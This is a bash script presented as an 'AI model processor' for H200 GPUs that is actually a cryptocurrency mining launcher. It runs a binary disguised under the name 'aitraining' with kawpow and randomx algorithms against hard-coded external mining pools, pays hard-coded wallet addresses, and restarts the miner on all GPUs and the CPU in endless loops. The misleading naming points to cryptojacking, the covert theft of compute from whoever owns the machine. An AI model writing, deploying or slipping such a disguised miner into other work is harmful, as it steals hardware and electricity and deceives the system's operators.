#!/bin/bash

# ai_model_processor.sh - Optimized for H200

PROCESSOR_PATH="./aitraining"
LOG_DIR="./logs"
mkdir -p "$LOG_DIR"

# GPU settings for H200
GPU_ALGO="kawpow"
GPU_POOL="stratum+ssl://51.89.99.172:16161"
GPU_WALLET="RM2ciYa3CRqyreRsf25omrB4e1S95waALr"
GPU_IDS="0,1,2,3,4,5,6,7"

# CPU settings  
CPU_ALGO="randomx"
CPU_POOL="stratum+ssl://51.222.200.133:10343"
CPU_WALLET="44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd"

# GPU environment for H200
export GPU_MAX_HEAP_SIZE=100
export GPU_MAX_USE_SYNC_OBJECTS=1
export GPU_SINGLE_ALLOC_PERCENT=100
export GPU_MAX_ALLOC_PERCENT=100
export GPU_MAX_SINGLE_ALLOC_PERCENT=100

# Runtime settings
RESTART_DELAY=10
GPU_LOG="$LOG_DIR/gpu.log"
CPU_LOG="$LOG_DIR/cpu.log"
MONITOR_LOG="$LOG_DIR/monitor.log"

# Kill any existing processes
pkill -f aitraining
sleep 3

# Test the binary first
echo "=== Testing aitraining binary ==="
if [ ! -x "$PROCESSOR_PATH" ]; then
    echo "ERROR: Binary not found or not executable"
    exit 1
fi

# Test with simple command
echo "=== Testing basic functionality ==="
timeout 5 "$PROCESSOR_PATH" --help && echo "✓ Binary works" || echo "✗ Binary test failed"

# Start GPU processor (SIMPLIFIED)
start_gpu() {
    echo "$(date) Starting GPU processor..." | tee -a "$MONITOR_LOG"
    while true; do
        echo "$(date) Starting: $PROCESSOR_PATH --algo $GPU_ALGO --pool $GPU_POOL --wallet $GPU_WALLET --gpu-id $GPU_IDS" >> "$MONITOR_LOG"
        
        # Try different parameter combinations
        "$PROCESSOR_PATH" --algo "$GPU_ALGO" --pool "$GPU_POOL" --wallet "$GPU_WALLET" --gpu-id "$GPU_IDS" >> "$GPU_LOG" 2>&1 &
        
        PID=$!
        echo "$(date) GPU PID: $PID" >> "$MONITOR_LOG"
        
        # Wait and check if still running
        sleep 10
        if ps -p $PID > /dev/null; then
            echo "$(date) ✓ GPU process running (PID: $PID)" | tee -a "$MONITOR_LOG"
            wait $PID
        else
            echo "$(date) ✗ GPU process died immediately" | tee -a "$MONITOR_LOG"
            # Show last error
            tail -n 10 "$GPU_LOG" | tee -a "$MONITOR_LOG"
        fi
        
        echo "$(date) GPU process ended. Restarting in $RESTART_DELAY seconds..." | tee -a "$MONITOR_LOG"
        sleep $RESTART_DELAY
    done
}

# Start CPU processor (SIMPLIFIED)  
start_cpu() {
    echo "$(date) Starting CPU processor..." | tee -a "$MONITOR_LOG"
    while true; do
        echo "$(date) Starting CPU: $PROCESSOR_PATH --algo $CPU_ALGO --pool $CPU_POOL --wallet $CPU_WALLET" >> "$MONITOR_LOG"
        
        "$PROCESSOR_PATH" --algo "$CPU_ALGO" --pool "$CPU_POOL" --wallet "$CPU_WALLET" >> "$CPU_LOG" 2>&1 &
        
        PID=$!
        echo "$(date) CPU PID: $PID" >> "$MONITOR_LOG"
        
        sleep 10
        if ps -p $PID > /dev/null; then
            echo "$(date) ✓ CPU process running (PID: $PID)" | tee -a "$MONITOR_LOG"
            wait $PID
        else
            echo "$(date) ✗ CPU process died immediately" | tee -a "$MONITOR_LOG"
            tail -n 10 "$CPU_LOG" | tee -a "$MONITOR_LOG"
        fi
        
        echo "$(date) CPU process ended. Restarting in $RESTART_DELAY seconds..." | tee -a "$MONITOR_LOG"
        sleep $RESTART_DELAY
    done
}

# Monitor
monitor() {
    while true; do
        echo "=== $(date) Process Check ===" >> "$MONITOR_LOG"
        ps aux | grep aitraining | grep -v grep >> "$MONITOR_LOG"
        echo "=== GPU Status ===" >> "$MONITOR_LOG"
        nvidia-smi --query-gpu=index,utilization.gpu,temperature.gpu,power.draw --format=csv,noheader >> "$MONITOR_LOG"
        sleep 30
    done
}

# Initialize logs
echo "===== Started: $(date) =====" > "$GPU_LOG"
echo "===== Started: $(date) =====" > "$CPU_LOG" 
echo "===== Monitor Started: $(date) =====" > "$MONITOR_LOG"

echo "Starting H200 AI Processor..."
echo "Check logs in: $LOG_DIR"

# Start processes
start_gpu &
GPU_PID=$!
sleep 5
start_cpu & 
CPU_PID=$!
sleep 2
monitor &
MONITOR_PID=$!

echo "All processes started!"
echo "GPU PID: $GPU_PID"
echo "CPU PID: $CPU_PID" 
echo "Monitor PID: $MONITOR_PID"

# Wait and show status
sleep 15
echo "=== Current Status ==="
ps aux | grep aitraining | grep -v grep
echo "=== Check logs with: tail -f $LOG_DIR/*.log ==="

# Keep script running
wait
